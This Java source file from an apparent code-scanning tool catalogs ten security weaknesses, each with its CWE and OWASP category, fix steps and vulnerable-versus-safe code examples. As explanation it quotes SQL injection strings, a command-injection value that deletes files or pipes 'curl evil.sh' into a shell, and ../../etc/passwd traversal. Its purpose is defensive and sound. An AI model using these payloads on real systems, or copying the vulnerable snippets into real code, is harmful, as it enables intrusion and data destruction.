package com.mycompany.cleancheck.security;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Optional;

/**
 * Everything CleanCheck knows about its security rules: the CWE and OWASP Top 10 (2021) category, how the
 * weakness is exploited, the safe fix and a before/after example. UI-free, so the rules, the Security Review
 * page, the HTML report and the SARIF export all read from one place.
 */
public final class SecurityCatalog {

    public static final String SQL_INJECTION = "SQL Injection";
    public static final String HARDCODED_SECRET = "Hardcoded Secret";
    public static final String WEAK_CRYPTO = "Weak Cryptography";
    public static final String INSECURE_RANDOM = "Insecure Random";
    public static final String COMMAND_INJECTION = "Command Injection";
    public static final String PATH_TRAVERSAL = "Path Traversal";
    public static final String UNSAFE_DESERIALIZATION = "Unsafe Deserialization";
    public static final String CERTIFICATE_CHECK = "Disabled Certificate Check";
    public static final String INFORMATION_LEAK = "Information Leak";
    public static final String XXE = "XML External Entity";

    /**
     * One security rule, explained.
     *
     * @param score a 0-10 number used as SARIF "security-severity" (GitHub shows it as Critical/High/Medium/Low)
     */
    public record Info(
            String rule,
            String cwe,
            String cweTitle,
            String owasp,
            String problem,
            String attack,
            List<String> steps,
            String bad,
            String good,
            double score) {

        /** The official description page of the weakness. */
        public String cweUrl() {
            return "https://cwe.mitre.org/data/definitions/" + cwe.replace("CWE-", "") + ".html";
        }

        /** One short sentence for the "Suggestion" column. */
        public String fix() {
            return steps.get(0);
        }
    }

    private static final Map<String, Info> INFOS = new LinkedHashMap<>();

    static {
        add(SQL_INJECTION, "CWE-89", "Improper Neutralization of Special Elements used in an SQL Command",
                "A03:2021 Injection",
                "A SQL query is built by joining strings, so data can change the meaning of the query.",
                "An attacker types ' OR '1'='1 (or worse, '; DROP TABLE users; --) into a field. The database runs it "
                        + "as part of the query: logins are bypassed, data is leaked or deleted.",
                List.of("Use a PreparedStatement with ? placeholders and pass the values with setString/setInt.",
                        "Never build SQL with + or String.format, even for 'safe-looking' values.",
                        "For table or column names, choose from a fixed allow-list instead of using the input."),
                "stmt.executeQuery(\"SELECT * FROM users WHERE name = '\" + name + \"'\");",
                "PreparedStatement ps = con.prepareStatement(\"SELECT * FROM users WHERE name = ?\");\n"
                        + "ps.setString(1, name);\nResultSet rs = ps.executeQuery();",
                9.0);
        add(HARDCODED_SECRET, "CWE-798", "Use of Hard-coded Credentials",
                "A07:2021 Identification and Authentication Failures",
                "A password, token or key is written as a literal in the source code.",
                "Anyone who can read the code (a repository, a decompiled jar, a leaked zip) gets the secret. "
                        + "It also stays in version control history after you delete it.",
                List.of("Read the secret from an environment variable or a secret manager at run time.",
                        "Rotate the exposed secret: treat it as already leaked.",
                        "Keep local config files with secrets out of version control (.gitignore)."),
                "String dbPassword = \"S3cret!2024\";",
                "String dbPassword = System.getenv(\"DB_PASSWORD\");",
                7.5);
        add(WEAK_CRYPTO, "CWE-327", "Use of a Broken or Risky Cryptographic Algorithm",
                "A02:2021 Cryptographic Failures",
                "The code uses an algorithm or mode that is considered broken (MD5, SHA-1, DES, RC4, ECB).",
                "Collisions can be produced for MD5 and SHA-1, DES keys can be brute-forced, and ECB leaks patterns "
                        + "in the data. Hashed passwords and signed data can then be forged or recovered.",
                List.of("Use SHA-256 or stronger for integrity; use a password hash (bcrypt, scrypt, Argon2, PBKDF2) for passwords.",
                        "Use AES-GCM (\"AES/GCM/NoPadding\") with a fresh random IV for encryption.",
                        "Never use ECB mode, and never use plain \"AES\" (it defaults to ECB)."),
                "MessageDigest.getInstance(\"MD5\");\nCipher.getInstance(\"DES/ECB/PKCS5Padding\");",
                "MessageDigest.getInstance(\"SHA-256\");\nCipher.getInstance(\"AES/GCM/NoPadding\");",
                5.3);
        add(INSECURE_RANDOM, "CWE-338", "Use of Cryptographically Weak Pseudo-Random Number Generator",
                "A02:2021 Cryptographic Failures",
                "java.util.Random (or Math.random) generates something that must be unpredictable, like a token or salt.",
                "Random is a simple formula: after seeing a few outputs an attacker can predict the next ones and "
                        + "guess session ids, reset tokens or one-time codes.",
                List.of("Use java.security.SecureRandom for tokens, passwords, salts, nonces and keys.",
                        "Generate enough bytes (at least 16) and encode them, for example with Base64 URL encoding.",
                        "Keep java.util.Random for games and simulations, where predictability does not matter."),
                "String token = Long.toHexString(new Random().nextLong());",
                "byte[] bytes = new byte[32];\nnew SecureRandom().nextBytes(bytes);\n"
                        + "String token = Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);",
                5.0);
        add(COMMAND_INJECTION, "CWE-78", "Improper Neutralization of Special Elements used in an OS Command",
                "A03:2021 Injection",
                "An operating-system command is built from variable data and run with Runtime.exec or ProcessBuilder.",
                "Input like 'file.txt; rm -rf ~' or '&& curl evil.sh | sh' is executed by the shell with the "
                        + "program's permissions: the attacker takes over the machine.",
                List.of("Avoid running commands. Use a Java API instead (Files, ZipFile, an HTTP client).",
                        "If you must, pass the program and every argument as separate items: new ProcessBuilder(\"tool\", arg).",
                        "Validate the argument against an allow-list and never pass it through \"sh -c\" or \"cmd /c\"."),
                "Runtime.getRuntime().exec(\"ping \" + host);",
                "if (!host.matches(\"[A-Za-z0-9.-]{1,253}\")) { throw new IllegalArgumentException(); }\n"
                        + "new ProcessBuilder(\"ping\", \"-c\", \"1\", host).start();",
                9.0);
        add(PATH_TRAVERSAL, "CWE-22", "Improper Limitation of a Pathname to a Restricted Directory",
                "A01:2021 Broken Access Control",
                "A file path is built from user input without checking that it stays inside the intended folder.",
                "A name like ../../etc/passwd (or ..\\..\\Windows\\win.ini) walks out of the upload folder, so the "
                        + "attacker can read or overwrite any file the program can reach.",
                List.of("Resolve the path against a base folder, normalize it, and check it still starts with that folder.",
                        "Better: ignore the user's path and keep only a safe file name (Path.getFileName()).",
                        "Or map ids to files yourself so the user never supplies a path at all."),
                "File f = new File(\"uploads/\" + request.getParameter(\"name\"));",
                "Path base = Path.of(\"uploads\").toRealPath();\n"
                        + "Path target = base.resolve(name).normalize();\n"
                        + "if (!target.startsWith(base)) { throw new SecurityException(\"Invalid path\"); }",
                6.5);
        add(UNSAFE_DESERIALIZATION, "CWE-502", "Deserialization of Untrusted Data",
                "A08:2021 Software and Data Integrity Failures",
                "ObjectInputStream (or XMLDecoder) rebuilds objects from bytes without limiting which classes are allowed.",
                "A crafted stream makes Java instantiate dangerous classes while reading. Known 'gadget chains' in "
                        + "common libraries turn this into remote code execution.",
                List.of("Do not deserialize data from outside your control. Prefer JSON with a fixed target type.",
                        "If you must, install an ObjectInputFilter that allows only the classes you expect.",
                        "Never read serialized objects from the network or from user-supplied files."),
                "Object o = new ObjectInputStream(socket.getInputStream()).readObject();",
                "ObjectInputStream in = new ObjectInputStream(stream);\n"
                        + "in.setObjectInputFilter(ObjectInputFilter.Config.createFilter(\"com.myapp.model.*;!*\"));",
                8.0);
        add(CERTIFICATE_CHECK, "CWE-295", "Improper Certificate Validation",
                "A07:2021 Identification and Authentication Failures",
                "A TrustManager or HostnameVerifier accepts every certificate or host name.",
                "HTTPS then protects nothing: anyone on the network (public Wi-Fi, a compromised router) can pose "
                        + "as the server and read or change the traffic (man-in-the-middle).",
                List.of("Remove the 'trust all' code and use the default TLS settings of the JDK.",
                        "If you use a private CA or a self-signed test server, add that certificate to a trust store.",
                        "Never ship a verifier that always returns true, not even 'for testing'."),
                "public void checkServerTrusted(X509Certificate[] chain, String type) { }",
                "// Use the default SSLContext, or load your own trust store:\n"
                        + "SSLContext ctx = SSLContext.getInstance(\"TLS\");\nctx.init(null, trustManagersFromStore, null);",
                7.5);
        add(INFORMATION_LEAK, "CWE-209", "Generation of Error Message Containing Sensitive Information",
                "A04:2021 Insecure Design",
                "Stack traces or exception messages are printed with printStackTrace or sent back to the user.",
                "Traces reveal class names, file paths, library versions and SQL. Attackers use them to map the "
                        + "system and choose an attack. In a server they also bypass your log format and log level.",
                List.of("Log the exception with a logger (the stack trace stays in the log, not on screen).",
                        "Show the user a short generic message such as 'Something went wrong' plus a reference id.",
                        "Never put e.getMessage() or a stack trace in an HTTP response."),
                "} catch (IOException e) {\n    e.printStackTrace();\n}",
                "} catch (IOException e) {\n    LOGGER.log(Level.SEVERE, \"Could not read the file\", e);\n}",
                5.3);
        add(XXE, "CWE-611", "Improper Restriction of XML External Entity Reference",
                "A05:2021 Security Misconfiguration",
                "An XML parser is created with its default settings, which may resolve external entities.",
                "A document can contain an entity that points to file:///etc/passwd or an internal URL. The parser "
                        + "inlines it, so the attacker reads local files or reaches internal servers (SSRF).",
                List.of("Turn on secure processing and disable DOCTYPE declarations on the factory.",
                        "For DocumentBuilderFactory: setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true).",
                        "Apply the same hardening to SAXParserFactory, XMLInputFactory and TransformerFactory."),
                "DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();",
                "DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();\n"
                        + "f.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n"
                        + "f.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);",
                6.5);
    }

    private SecurityCatalog() {
    }

    private static void add(String rule, String cwe, String cweTitle, String owasp, String problem, String attack,
            List<String> steps, String bad, String good, double score) {
        INFOS.put(rule.toLowerCase(Locale.ROOT),
                new Info(rule, cwe, cweTitle, owasp, problem, attack, List.copyOf(steps), bad, good, score));
    }

    public static boolean isSecurity(String ruleName) {
        return ruleName != null && INFOS.containsKey(ruleName.trim().toLowerCase(Locale.ROOT));
    }

    public static Optional<Info> info(String ruleName) {
        if (ruleName == null) {
            return Optional.empty();
        }
        return Optional.ofNullable(INFOS.get(ruleName.trim().toLowerCase(Locale.ROOT)));
    }

    public static List<Info> all() {
        return new ArrayList<>(INFOS.values());
    }
}
